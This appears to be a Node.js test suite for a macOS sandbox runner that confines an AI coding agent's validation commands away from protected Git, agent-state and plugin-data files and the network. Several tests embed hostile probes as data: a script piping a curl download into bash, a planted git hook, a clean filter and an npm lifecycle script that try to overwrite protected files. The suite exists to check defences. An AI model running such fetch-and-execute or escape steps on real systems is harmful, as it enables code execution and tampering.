import assert from "node:assert/strict";
import { execFileSync, spawnSync, spawn } from "node:child_process";
import { once } from "node:events";
import { chmodSync, existsSync, linkSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import test, { after, before } from "node:test";
import { calculateRuntimeDigest } from "../../adapters/codex/hooks/dispatcher.mjs";
import { rejectWritableAliases } from "../../adapters/codex/hooks/restricted-runner.mjs";
import { canonicalFutureDirectory, evaluatePreToolUse, makeRestrictedCommand } from "../../adapters/codex/hooks/repo-policy.mjs";

const ROOT = realpathSync(fileURLToPath(new URL("../../", import.meta.url)));
const NODE = realpathSync(process.execPath);
const RUNNER = join(ROOT, "adapters/codex/hooks/restricted-runner.mjs");
const PATH = `${dirname(NODE)}:/opt/homebrew/bin:/usr/bin:/bin`;
const GIT_READ = "git --no-pager --no-optional-locks --no-lazy-fetch -c core.fsmonitor=false -c core.hooksPath=/dev/null";
let fixtures;
let serial = 0;
let unavailable;

before(() => {
  fixtures = realpathSync(mkdtempSync("/private/tmp/tmb-restricted-runner-tests-"));
  if (process.platform !== "darwin") unavailable = "restricted runner requires macOS";
  else {
    const probe = spawnSync("/usr/bin/sandbox-exec", ["-p", "(version 1) (allow default)", "/usr/bin/true"], { encoding: "utf8" });
    if (probe.status !== 0) unavailable = `macOS sandbox unavailable: ${probe.stderr.trim()}`;
  }
});
after(() => { if (fixtures) rmSync(fixtures, { recursive: true, force: true }); });

function fixture() {
  const base = join(fixtures, String(++serial));
  const root = join(base, "checkout");
  mkdirSync(root, { recursive: true });
  execFileSync("/usr/bin/git", ["init", "-q", "-b", "feature/runner"], { cwd: root, env: { PATH, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" } });
  for (const [key, value] of [["user.name", "Isolated Test"], ["user.email", "test@example.invalid"]]) {
    execFileSync("/usr/bin/git", ["config", "--local", key, value], { cwd: root });
  }
  writeFileSync(join(root, "source.txt"), "before\n");
  const markers = [join(root, ".git", "protected-marker"), join(base, "outside-secret")];
  for (const name of [".tmb", ".claude", ".codex"]) {
    mkdirSync(join(root, name));
    markers.push(join(root, name, "protected-marker"));
  }
  for (const path of markers) writeFileSync(path, "protected\n");
  return { base, root, markers };
}
function argumentsFor(f, command, hash = calculateRuntimeDigest(ROOT)) {
  return [RUNNER, "--policy-sha256", hash, "--cwd", f.root, "--command", command];
}
function run(f, command, extra = {}) {
  return spawnSync("/usr/bin/env", ["-i", ...Object.entries(extra.env ?? { PATH }).map(([key, value]) => `${key}=${value}`), NODE, ...argumentsFor(f, command)], { cwd: f.root, env: { PATH }, encoding: "utf8", timeout: 15_000, maxBuffer: 10 * 1024 * 1024, ...extra });
}
function ok(result) { assert.equal(result.status, 0, `${result.error?.message ?? ""}\n${result.stderr}\n${result.stdout}`); }
function ready(t) { if (!unavailable) return true; t.skip(unavailable); return false; }
function unchanged(f) { for (const path of f.markers) assert.equal(readFileSync(path, "utf8"), "protected\n", path); }

test("runner rejects altered runtime digest and inherited preload environment before the payload", () => {
  const f = fixture();
  writeFileSync(join(f.root, "probe.test.mjs"), "throw new Error('PAYLOAD-MUST-NOT-START');\n");
  const changed = spawnSync("/usr/bin/env", ["-i", `PATH=${PATH}`, NODE, ...argumentsFor(f, "node --test probe.test.mjs", "0".repeat(64))], { env: { PATH }, encoding: "utf8" });
  assert.equal(changed.status, 125);
  assert.match(changed.stderr, /digest mismatch/);
  const inherited = run(f, "node --test probe.test.mjs", { env: { PATH, HOME: f.base } });
  assert.equal(inherited.status, 125);
  assert.match(inherited.stderr, /env -i/);
  assert.doesNotMatch(changed.stderr + inherited.stderr, /PAYLOAD-MUST-NOT-START/);
});

test("mutable validation and its child can write source but cannot read secrets, alter state, or connect", t => {
  if (!ready(t)) return;
  const f = fixture();
  const helper = `import fs from 'node:fs'; import net from 'node:net';
    const attempt = fn => { try { fn(); return 'allowed'; } catch(e) { return e.code; } };
    const paths = ${JSON.stringify(f.markers)};
    const writes = paths.map(p => attempt(() => fs.writeFileSync(p, 'changed')));
    const reads = paths.slice(1).map(p => attempt(() => fs.readFileSync(p)));
    const network = await new Promise(resolve => { const s=net.connect({host:'127.0.0.1',port:9}); s.on('connect',()=>{s.destroy();resolve('connected')});s.on('error',e=>resolve(e.code)); });
    fs.writeFileSync('result.json', JSON.stringify({writes,reads,network}));
    fs.writeFileSync('source.txt','after\\n');`;
  writeFileSync(join(f.root, "helper.mjs"), helper);
  writeFileSync(join(f.root, "probe.test.mjs"), "import {execFileSync} from 'node:child_process'; execFileSync(process.execPath,['helper.mjs']);\n");
  ok(run(f, "node --test probe.test.mjs"));
  const result = JSON.parse(readFileSync(join(f.root, "result.json"), "utf8"));
  for (const value of [...result.writes, ...result.reads, result.network]) assert.ok(["EPERM", "EACCES"].includes(value), value);
  assert.equal(readFileSync(join(f.root, "source.txt"), "utf8"), "after\n");
  unchanged(f);
});

test("the system Bash validation entrypoint runs without granting filesystem-root reads", t => {
  if (!ready(t)) return;
  const f = fixture();
  mkdirSync(join(f.root, "tests"));
  writeFileSync(join(f.root, "tests/run-all.sh"), `printf '%s' "$BASH" > shell-path
printf 'after\\n' > source.txt
if /bin/cat '${f.markers[1]}' > /dev/null; then exit 91; fi
`);
  ok(run(f, "bash tests/run-all.sh", { env: { PATH: `/bin:/usr/bin:${dirname(NODE)}` } }));
  assert.equal(readFileSync(join(f.root, "shell-path"), "utf8"), "/bin/bash");
  assert.equal(readFileSync(join(f.root, "source.txt"), "utf8"), "after\n");
  unchanged(f);
});

test("a rewritten Bash validation script cannot fetch a payload or change protected files", async t => {
  if (!ready(t)) return;
  const f = fixture();
  mkdirSync(join(f.root, "tests"));
  writeFileSync(join(f.root, "tests/run-all.sh"), "true\n");
  let requests = 0;
  const server = createServer((_request, response) => {
    requests += 1;
    response.end("printf received > network-marker\n");
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  try {
    writeFileSync(join(f.root, "network.cjs"), `const fs=require('node:fs');
const socket=require('node:net').createConnection({host:'127.0.0.1',port:${server.address().port}});
const finish=value=>{fs.writeFileSync('network-result',value);socket.destroy()};
socket.on('connect',()=>finish('connected'));
socket.on('error',error=>finish(error.code));
socket.setTimeout(2000,()=>finish('timed-out'));
`);
    const script = [
      "printf 'after\\n' > source.txt",
      `/usr/bin/curl --noproxy '*' -sS --max-time 2 http://127.0.0.1:${server.address().port}/probe.sh | /bin/bash`,
      `'${NODE}' network.cjs`,
      ...f.markers.map(marker => `printf changed > '${marker}'`),
      "exit 0",
    ].join("\n");
    const event = { hook_event_name: "PreToolUse", permission_mode: "default", cwd: f.root };
    const patch = `*** Begin Patch\n*** Update File: tests/run-all.sh\n@@\n-true\n${script.split("\n").map(line => `+${line}`).join("\n")}\n*** End Patch`;
    const decision = await evaluatePreToolUse({ ...event, tool_name: "apply_patch", tool_input: { command: patch } });
    assert.equal(decision.decision, "allow", decision.reason);
    writeFileSync(join(f.root, "tests/run-all.sh"), `${script}\n`);
    const child = spawn("/usr/bin/env", ["-i", `PATH=/bin:/usr/bin:${dirname(NODE)}`, NODE,
      ...argumentsFor(f, "bash tests/run-all.sh")], { cwd: f.root, env: { PATH }, stdio: ["ignore", "pipe", "pipe"] });
    let stderr = "";
    child.stdout.resume();
    child.stderr.on("data", chunk => { stderr += chunk; });
    const [code] = await once(child, "close");
    assert.equal(code, 0, stderr);
    assert.match(stderr, /Operation not permitted/u);
    assert.equal(requests, 0);
    assert.equal(existsSync(join(f.root, "network-marker")), false);
    assert.ok(["EPERM", "EACCES"].includes(readFileSync(join(f.root, "network-result"), "utf8")));
    assert.equal(readFileSync(join(f.root, "source.txt"), "utf8"), "after\n");
    unchanged(f);
  } finally {
    await new Promise((resolve, reject) => server.close(error => error ? reject(error) : resolve()));
  }
});

test("npm lifecycle execution retains the validation sandbox", t => {
  if (!ready(t)) return;
  const f = fixture();
  writeFileSync(join(f.root, "lifecycle.cjs"), `const fs=require('fs');try {fs.writeFileSync(${JSON.stringify(f.markers[0])},'changed');throw Error('escaped')}catch(e){if(!['EPERM','EACCES'].includes(e.code))throw e}fs.writeFileSync('lifecycle-result','denied');`);
  writeFileSync(join(f.root, "package.json"), JSON.stringify({ scripts: { pretest: "node lifecycle.cjs", test: "node --version" } }));
  ok(run(f, "npm test"));
  assert.equal(readFileSync(join(f.root, "lifecycle-result"), "utf8"), "denied");
  unchanged(f);
});

test("host-pinned plugin data remains protected inside an ordinary checkout directory", t => {
  if (!ready(t)) return;
  const f = fixture();
  const data = join(f.root, "custom-plugin-data");
  mkdirSync(data);
  const marker = join(data, "private");
  writeFileSync(marker, "private-before");
  writeFileSync(join(f.root, "probe.test.mjs"), `import fs from 'node:fs';import assert from 'node:assert/strict';
    const marker = new URL('./custom-plugin-data/private', import.meta.url);
    for(const operation of [()=>fs.readFileSync(marker),()=>fs.writeFileSync(marker,'changed')]) {
      assert.throws(operation,e=>['EPERM','EACCES'].includes(e.code));
    }`);
  ok(run(f, "node --test probe.test.mjs", { env: { PATH, TMB_CODEX_PLUGIN_DATA: data } }));
  assert.equal(readFileSync(marker, "utf8"), "private-before");
});

test("future plugin data resolves directory ancestors without creating state or accepting dangling links", () => {
  const f = fixture();
  const data = join(f.base, "not-created", "plugin-data");
  assert.equal(canonicalFutureDirectory(data), data);
  assert.equal(existsSync(join(f.base, "not-created")), false);
  const alias = join(f.base, "checkout-alias");
  symlinkSync(f.root, alias);
  assert.equal(canonicalFutureDirectory(join(alias, "future-data")), join(f.root, "future-data"));
  const dangling = join(f.base, "dangling");
  symlinkSync(join(f.base, "missing-target"), dangling);
  for (const path of ["/", "relative/data", `${data}\0`, join(f.root, "source.txt"),
    join(f.root, "source.txt", "data"), dangling, join(dangling, "data")]) {
    assert.equal(canonicalFutureDirectory(path), null, path);
  }
});

test("the Hook pins missing plugin data and denies patches into its future path", async () => {
  const f = fixture();
  const data = join(f.root, "ordinary", "plugin-data");
  const options = { pluginRoot: ROOT, pluginData: data };
  const event = { hook_event_name: "PreToolUse", permission_mode: "default", cwd: f.root };
  const cmd = makeRestrictedCommand(`${GIT_READ} status --short`, f.root, options);
  assert.ok(cmd.includes(`'TMB_CODEX_PLUGIN_DATA=${data}'`));
  const source = `text(JSON.stringify(await tools.exec_command(${JSON.stringify({
    cmd, workdir: f.root, shell: "/bin/sh", login: false, tty: false,
  })})));`;
  const wrapped = await evaluatePreToolUse({ ...event, tool_name: "functions.exec", tool_input: source }, options);
  assert.equal(wrapped.decision, process.platform === "darwin" ? "allow" : "deny", wrapped.reason);
  if (process.platform !== "darwin") assert.match(wrapped.reason, /qualified macOS/);
  for (const path of ["ordinary/plugin-data/private", "OrDiNaRy/PlUgIn-DaTa/private"]) {
    const result = await evaluatePreToolUse({ ...event, tool_name: "apply_patch", tool_input: {
      command: `*** Begin Patch\n*** Add File: ${path}\n+must not be created\n*** End Patch`,
    } }, options);
    assert.equal(result.decision, "deny", path);
    assert.match(result.reason, /protected/);
  }
  assert.equal(existsSync(join(f.root, "ordinary")), false);
});

test("validation runs with missing pinned plugin data but cannot create that protected directory", t => {
  if (!ready(t)) return;
  const f = fixture();
  const data = join(f.root, "ordinary", "plugin-data");
  writeFileSync(join(f.root, "probe.test.mjs"), `import fs from 'node:fs';import assert from 'node:assert/strict';
    assert.throws(()=>fs.mkdirSync(${JSON.stringify(data)},{recursive:true}),e=>['EPERM','EACCES'].includes(e.code));
    fs.writeFileSync('source.txt','validation-ran');`);
  ok(run(f, "node --test probe.test.mjs", { env: { PATH, TMB_CODEX_PLUGIN_DATA: data } }));
  assert.equal(readFileSync(join(f.root, "source.txt"), "utf8"), "validation-ran");
  assert.equal(existsSync(data), false);
  unchanged(f);
});

test("the runner rejects a pinned future directory redirected through a new symlink", t => {
  if (!ready(t)) return;
  const f = fixture();
  const data = join(f.root, "future-plugin-data");
  assert.equal(canonicalFutureDirectory(data), data);
  const redirected = join(f.base, "redirected-data");
  mkdirSync(redirected);
  symlinkSync(redirected, data);
  writeFileSync(join(f.root, "probe.test.mjs"), "throw Error('PAYLOAD-MUST-NOT-START');");
  const result = run(f, "node --test probe.test.mjs", { env: { PATH, TMB_CODEX_PLUGIN_DATA: data } });
  assert.equal(result.status, 125);
  assert.match(result.stderr, /plugin data path must already identify a canonical/);
  assert.doesNotMatch(result.stderr, /PAYLOAD-MUST-NOT-START/);
});

test("hard-link aliases prevent validation from starting", t => {
  if (!ready(t)) return;
  const f = fixture();
  linkSync(f.markers[0], join(f.root, "alias"));
  assert.throws(() => rejectWritableAliases(f.root, { skipProtected: true }), /hard-link alias/);
  writeFileSync(join(f.root, "probe.test.mjs"), "throw Error('PAYLOAD-MUST-NOT-START');");
  const result = run(f, "node --test probe.test.mjs");
  assert.equal(result.status, 125);
  assert.match(result.stderr, /hard-link alias/);
  assert.doesNotMatch(result.stderr, /PAYLOAD-MUST-NOT-START/);
  unchanged(f);
});

test("ordinary Git status, staging and commit remain functional", t => {
  if (!ready(t)) return;
  const f = fixture();
  ok(run(f, `${GIT_READ} status --short`));
  ok(run(f, "git add -- source.txt"));
  ok(run(f, "git commit -m 'test: isolated runner'"));
  const subject = execFileSync("/usr/bin/git", ["log", "-1", "--format=%s"], { cwd: f.root, encoding: "utf8" }).trim();
  assert.equal(subject, "test: isolated runner");
  unchanged(f);
});

test("local delivery refuses executable hooks before changing the index", t => {
  if (!ready(t)) return;
  const f = fixture();
  const hook = join(f.root, ".git", "hooks", "pre-commit");
  writeFileSync(hook, `#!/bin/sh\nprintf escaped > '${f.markers[0]}'\n`);
  chmodSync(hook, 0o700);
  const result = run(f, "git add -- source.txt");
  assert.equal(result.status, 125);
  assert.match(result.stderr, /executable repository hooks/);
  assert.equal(existsSync(join(f.root, ".git", "index")), false);
  unchanged(f);
});

test("Git configuration preflight cannot follow an include into Claude state", t => {
  if (!ready(t)) return;
  const f = fixture();
  writeFileSync(join(f.root, ".claude", "identity"), "[user]\nname = PRIVATE-CLAUDE-IDENTITY\n");
  execFileSync("/usr/bin/git", ["config", "--local", "include.path", "../.claude/identity"], { cwd: f.root });
  const result = run(f, "git add -- source.txt");
  assert.equal(result.status, 125);
  assert.equal(existsSync(join(f.root, ".git", "index")), false);
  assert.doesNotMatch(result.stderr + result.stdout, /PRIVATE-CLAUDE-IDENTITY/);
  unchanged(f);
});

test("Git read clean filters inherit the read-only sandbox", t => {
  if (!ready(t)) return;
  const f = fixture();
  const git = (...args) => execFileSync("/usr/bin/git", args, {
    cwd: f.root, env: { PATH, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" },
    stdio: ["ignore", "pipe", "pipe"],
  });
  git("add", "source.txt");
  git("commit", "-m", "test: filter baseline");
  writeFileSync(join(f.root, ".gitattributes"), "source.txt filter=probe\n");
  writeFileSync(join(f.root, "filter.cjs"), `const fs=require('node:fs');
    try { fs.writeFileSync(${JSON.stringify(f.markers[2])},'changed');throw Error('escaped'); }
    catch(e) { if(!['EPERM','EACCES'].includes(e.code))throw e;process.stderr.write('FILTER-DENIED\\n'); }
    process.stdout.write(fs.readFileSync(0));`);
  git("config", "filter.probe.clean", `${NODE} filter.cjs`);
  writeFileSync(join(f.root, "source.txt"), "changed source\n");
  const result = run(f, `${GIT_READ} diff --no-ext-diff --no-textconv -- source.txt`);
  ok(result);
  assert.match(result.stderr, /FILTER-DENIED/);
  assert.match(result.stdout, /changed source/);
  unchanged(f);
});

test("runner drains ordinary output and bounds signal termination", async t => {
  if (!ready(t)) return;
  const f = fixture();
  writeFileSync(join(f.root, "probe.test.mjs"), "process.stdout.write('x'.repeat(200000));\n");
  const output = run(f, "node --test probe.test.mjs");
  ok(output);
  assert.ok(output.stdout.includes("x".repeat(200000)));
  writeFileSync(join(f.root, "probe.test.mjs"), "process.on('SIGTERM',()=>{});process.stdout.write('RUNNING\\n');setInterval(()=>{},1000);\n");
  const child = spawn("/usr/bin/env", ["-i", `PATH=${PATH}`, NODE, ...argumentsFor(f, "node --test probe.test.mjs")], { env: { PATH }, cwd: f.root, stdio: ["ignore", "pipe", "pipe"] });
  const exit = once(child, "exit");
  await once(child.stdout, "data");
  child.kill("SIGTERM");
  const [code] = await exit;
  assert.equal(code, 143);
});
